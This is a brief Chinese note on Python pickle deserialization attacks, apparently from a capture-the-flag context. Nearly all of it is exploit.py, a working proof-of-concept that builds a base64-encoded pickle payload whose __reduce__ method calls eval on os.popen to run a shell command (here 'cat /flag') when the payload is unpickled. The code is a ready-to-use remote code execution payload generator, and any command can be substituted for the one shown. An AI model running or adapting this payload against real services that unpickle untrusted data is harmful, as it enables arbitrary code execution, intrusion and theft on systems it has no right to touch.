# pickle反序列化

exploit.py

```python
import pickle
import base64
class genpoc(object):
    def __reduce__(self):
        cmd = 'cat /flag'  # 要执行的命令
        s = f"__import__('os').popen('{cmd}').read().encode()" # 有回显的命令
        return (eval, (s,))  # reduce函数必须返回元组或字符串

poc = pickle.dumps(genpoc())
print(base64.b64encode(poc))
```
